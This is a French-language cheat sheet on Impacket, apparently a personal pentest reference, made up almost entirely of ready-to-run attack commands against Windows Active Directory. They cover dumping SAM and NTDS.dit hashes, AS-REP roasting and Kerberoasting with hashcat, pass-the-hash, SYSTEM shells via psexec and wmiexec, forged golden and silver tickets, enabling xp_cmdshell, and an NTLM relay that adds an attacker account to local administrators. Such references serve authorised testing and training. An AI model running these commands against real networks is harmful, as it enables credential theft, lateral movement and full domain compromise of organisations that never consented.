---
title: Impacket
domain: sciences-appliquées
subdomain: informatique / sécurité / outils
tags: [impacket, active-directory, smb, kerberos, ntlm, pentest, sécurité, outils]
date: 2026-03-22
---

# Impacket

Impacket est une collection de scripts Python pour interagir avec des protocoles réseau Windows (SMB, LDAP, Kerberos, MSSQL, DCERPC). C'est l'outil de référence pour les tests en environnement Active Directory.

## Installation

```bash
pip3 install impacket
# Ou depuis les sources pour la dernière version
git clone https://github.com/fortra/impacket && cd impacket
pip3 install .

# Les scripts se trouvent dans impacket/examples/
# Ou directement disponibles via pip : impacket-<script>
```

## Authentification — syntaxe commune

```bash
# Format général de la plupart des scripts
<script>.py [domaine/]utilisateur[:mot_de_passe]@<cible>

# Avec un hash NTLM (pass-the-hash)
<script>.py -hashes :<hash_ntlm> domaine/utilisateur@cible

# Avec un ticket Kerberos (pass-the-ticket)
export KRB5CCNAME=ticket.ccache
<script>.py -k -no-pass domaine/utilisateur@cible

# Avec un hash AES (overpass-the-hash)
<script>.py -aesKey <aes_key> domaine/utilisateur@cible
```

## Extraction de credentials

### secretsdump — dump des hashes et secrets

```bash
# Dump distant des hashes SAM (nécessite admin)
impacket-secretsdump domaine/admin:password@192.168.1.10

# Avec pass-the-hash
impacket-secretsdump -hashes :a4b7c3d1e2f3a4b5... WORKGROUP/Administrator@192.168.1.10

# Local — depuis des fichiers SAM/SYSTEM extraits
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL  # Dump du contrôleur de domaine

# Résultat format :
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
# Compte:RID:LM_hash:NTLM_hash

# Options utiles
impacket-secretsdump domaine/admin:password@DC01 -just-dc-ntlm  # Seulement les hashes NT
impacket-secretsdump domaine/admin:password@DC01 -just-dc-user alice  # Un seul utilisateur
```

### GetNPUsers — AS-REP Roasting

```bash
# Trouver les comptes sans pré-authentification Kerberos (AS-REP Roasting)
impacket-GetNPUsers domaine/ -dc-ip 192.168.1.10 -no-pass -usersfile users.txt

# Avec authentification (récupère tous les comptes vulnérables)
impacket-GetNPUsers domaine/alice:password -dc-ip 192.168.1.10 -request

# Résultat : hash Kerberos craquable hors ligne
# $krb5asrep$23$alice@DOMAINE:... → john/hashcat
john --wordlist=/usr/share/wordlists/rockyou.txt asrep_hashes.txt
hashcat -m 18200 asrep_hashes.txt rockyou.txt
```

### GetUserSPNs — Kerberoasting

```bash
# Trouver les comptes avec SPN (Kerberoasting)
impacket-GetUserSPNs domaine/alice:password -dc-ip 192.168.1.10

# Demander les tickets TGS (craquables hors ligne)
impacket-GetUserSPNs domaine/alice:password -dc-ip 192.168.1.10 -request -output kerberoast.txt

# Résultat : hash TGS
# $krb5tgs$23$*service$DOMAINE$... → craquage avec hashcat
hashcat -m 13100 kerberoast.txt rockyou.txt
```

## Exécution à distance

### psexec — shell via SMB (445)

```bash
# Shell interactif en SYSTEM
impacket-psexec domaine/admin:password@192.168.1.10

# Commande spécifique
impacket-psexec domaine/admin:password@192.168.1.10 "ipconfig /all"

# Avec pass-the-hash
impacket-psexec -hashes :ntlm_hash Administrator@192.168.1.10

# Mécanisme : upload d'un service Windows via SMB → exécution en SYSTEM
```

### wmiexec — exécution via WMI (port 135)

```bash
# Shell semi-interactif (sans service Windows installé)
impacket-wmiexec domaine/admin:password@192.168.1.10

# Moins bruyant que psexec (pas de service créé)
impacket-wmiexec -hashes :ntlm_hash domaine/admin@192.168.1.10
```

### smbexec — exécution via SMB (sans upload de fichier)

```bash
impacket-smbexec domaine/admin:password@192.168.1.10
```

### atexec — via le planificateur de tâches

```bash
impacket-atexec domaine/admin:password@192.168.1.10 "whoami > C:\\temp\\out.txt"
```

### dcomexec — via DCOM

```bash
impacket-dcomexec domaine/admin:password@192.168.1.10 "cmd.exe /c whoami"
```

## SMB — accès aux partages

```bash
# Lister les partages
impacket-smbclient domaine/alice:password@192.168.1.10
# smb: \> shares
# smb: \> use C$
# smb: \> ls
# smb: \> get secret.txt
# smb: \> put malware.exe

# Spider automatique d'un partage
impacket-smbclient domaine/alice:password@192.168.1.10 -no-pass

# Vérifier les droits sans mot de passe (null session)
impacket-smbclient //192.168.1.10/IPC$ -U ""

# smbmap (énumération de partages)
# smbmap -H 192.168.1.10 -u alice -p password -d domaine
```

## Kerberos — manipulation de tickets

### ticketer — créer des tickets Kerberos forgés

```bash
# Golden Ticket — ticket TGT forgé (nécessite le hash du compte KRBTGT)
impacket-ticketer \
    -nthash <krbtgt_hash> \
    -domain-sid S-1-5-21-... \
    -domain domaine.local \
    -user-id 500 \
    administrator

export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass domaine.local/administrator@DC01.domaine.local

# Silver Ticket — ticket TGS forgé (pour un service spécifique)
impacket-ticketer \
    -nthash <service_hash> \
    -domain-sid S-1-5-21-... \
    -domain domaine.local \
    -spn CIFS/SERVER01.domaine.local \
    administrator
```

### getTGT / getST — obtenir des tickets

```bash
# Obtenir un TGT (avec mot de passe)
impacket-getTGT domaine.local/alice:password
export KRB5CCNAME=alice.ccache

# Obtenir un ST (Service Ticket) — délégation
impacket-getST -spn CIFS/SERVER01 domaine.local/alice:password
```

## LDAP et Active Directory

```bash
# Énumération LDAP
impacket-ldapdomaindump domaine/alice:password -n 192.168.1.10
# Génère des fichiers HTML/JSON avec : utilisateurs, groupes, GPO, ordinateurs

# Résultats dans le répertoire courant :
# domain_users.html, domain_groups.html, domain_computers.html...
```

## MSSQL

```bash
# Connexion à une instance MSSQL
impacket-mssqlclient domaine/alice:password@192.168.1.20

# Commandes dans le shell mssqlclient
SQL> select @@version;
SQL> xp_cmdshell "whoami"     # Exécution de commande (si activé)
SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

## Relay et capture de hashes

### ntlmrelayx — relais NTLM

```bash
# Relayer les authentifications NTLM capturées vers une autre cible
impacket-ntlmrelayx -tf targets.txt -smb2support

# Avec exécution de commande sur la cible relayée
impacket-ntlmrelayx -tf targets.txt -smb2support -c "net localgroup administrators attaquant /add"

# Dump SAM sur la cible relayée
impacket-ntlmrelayx -tf targets.txt -smb2support --dump-lm

# Scénario classique (avec Responder)
# Terminal 1 : Responder -I eth0 -rdw  (capture NTLM)
# Terminal 2 : ntlmrelayx -tf targets.txt  (relaie vers les cibles)
```

## Référence rapide

| Outil | Usage |
|---|---|
| `secretsdump` | Dump SAM, NTDS.dit, LSA secrets |
| `GetNPUsers` | AS-REP Roasting |
| `GetUserSPNs` | Kerberoasting |
| `psexec` | Shell SYSTEM via SMB (bruyant) |
| `wmiexec` | Shell via WMI (plus discret) |
| `smbclient` | Navigation des partages SMB |
| `ntlmrelayx` | Relais NTLM (MITM) |
| `ticketer` | Golden/Silver tickets |
| `ldapdomaindump` | Énumération AD via LDAP |
| `mssqlclient` | Connexion MSSQL |
